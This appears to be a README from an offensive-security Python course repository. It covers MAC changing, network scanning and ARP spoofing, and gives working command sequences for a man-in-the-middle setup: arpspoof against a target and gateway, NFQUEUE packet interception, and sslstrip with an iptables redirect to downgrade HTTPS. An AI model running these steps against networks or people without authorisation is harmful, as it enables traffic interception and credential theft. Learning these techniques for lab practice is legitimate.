# Offensive Security Python
> From Zaid Sabih

* Topics
- Changing MAC Address 
- Network Scanner
- ARP Spoofing
- Packet Sniffer
- DNS Spoofer
- Replace Download

## Playbook
> Check on how to use these tools 

## Dependencies on PIP
- scapy
- scapy_http
- netfilterqueue

# Notes
> On doing this things manually or with another tool

## Changing MAC ADDRESS
Commands
```
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
ifconfig wlan0 
```
## ARP SPOOF 
* Reminder you need to enable ip forwarding in Linux First
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
 * exceptions in ubuntu 
 > as a normal user, you won't be able to write to the file due to insufficient permission.  
 Use sudo and bash:

```
 sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
```

 Use tee:

```
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Terminal 1 for Target  
```
arpspoof -i <INTERFACE> -t <TARGET IP> <GATEWAY IP>
arpspoof -i eth0 -t 10.0.2.7 10.0.2.1
```

Terminal 2 for Gateway  
```
arpspoof -i <INTERFACE> -t <GATEWAY IP> <TARGET IP>
arpspoof -i eth0 -t 10.0.2.1 10.0.2.7 
```

## Intercepting Packets

To queue all request to number 0
```
iptables -I FORWARD -j NFQUEUE --queue-num 0
```

to restore them
```
iptables --flush
```

## Bypassing HTTPS

* Terminal 1 
> Goal To be MITM  
> Let's use our arp spoof file

```
python arpspoof.py
```

* Terminal 2
> Goal is to use SSLstrip
> ssltrip default port is 10000

```
sslstrip
```

* Terminal 3
> Goal 
> 

```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```



--- 

### Python 3 Compatibility

pip3 install scapy-python3

#### Same line Printing 
print("\r [+] Info counter", end="")

